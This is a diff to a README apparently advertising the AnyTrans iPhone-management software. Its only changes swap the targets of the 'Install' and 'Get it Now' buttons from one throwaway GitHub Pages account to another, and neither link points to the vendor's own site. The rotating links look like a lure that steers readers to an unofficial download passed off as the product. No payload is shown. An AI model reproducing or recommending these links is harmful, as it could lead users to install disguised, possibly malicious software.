@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://six-sevens.github.io/.github/anyTrans)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://stul-stol.github.io/.github/anyTrans)
 
 </div>
 
@@ -81,7 +81,7 @@ AnyTrans's core value is restoring bidirectional control that Apple progressivel
 
 <p align="center">
 
-[![Get it Now AnyTrans](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://six-sevens.github.io/.github/anyTrans)
+[![Get it Now AnyTrans](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://stul-stol.github.io/.github/anyTrans)
 
 </p>
 
